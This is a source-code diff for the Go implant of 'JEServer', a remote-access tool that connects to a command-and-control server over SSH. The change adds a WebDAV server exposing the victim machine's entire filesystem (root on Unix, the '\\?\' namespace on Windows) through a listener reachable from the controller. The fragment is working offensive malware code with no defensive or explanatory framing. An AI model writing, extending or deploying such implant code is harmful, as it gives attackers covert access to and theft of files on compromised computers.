@@ -6,7 +6,7 @@ package main
  * Implant side of JEServer
  * By J. Stuart McMurray
  * Created 20220326
- * Last Modified 20220327
+ * Last Modified 20220331
  */
 
 import (
@@ -15,11 +15,14 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
+	"runtime"
 	"strings"
 	"sync"
 
 	"golang.org/x/crypto/ssh"
+	"golang.org/x/net/webdav"
 )
 
 var (
@@ -36,6 +39,9 @@ var (
 	// RLock'd while using it.
 	C2Conn  ssh.Conn
 	C2ConnL sync.RWMutex
+
+	// WDListener is a FakeListener which hadles WebDAV connections.
+	WDListener *FakeListener
 )
 
 func main() {
@@ -81,6 +87,25 @@ func main() {
 		Debugf("Unable to parse private key: %s", err)
 	}
 	PrivKey = "" /* It's a try, anyways. */
+
+	/* Start a WebDAV server. */
+	var wdDir = "/"
+	WDListener = NewFakeListener("webdav", "internal")
+	if "windows" == runtime.GOOS {
+		wdDir = `\\?\`
+	}
+	go func() {
+		Logf(
+			"Error serving WebDAV: %s",
+			(&http.Server{
+				Handler: &webdav.Handler{
+					FileSystem: webdav.Dir(wdDir),
+					LockSystem: webdav.NewMemLS(),
+				},
+				ErrorLog: NewWebDAVLogger(),
+			}).Serve(WDListener),
+		)
+	}()
 
 	/* Connect to the C2 server. */
 	cc, chans, reqs, err := ConnectToC2()
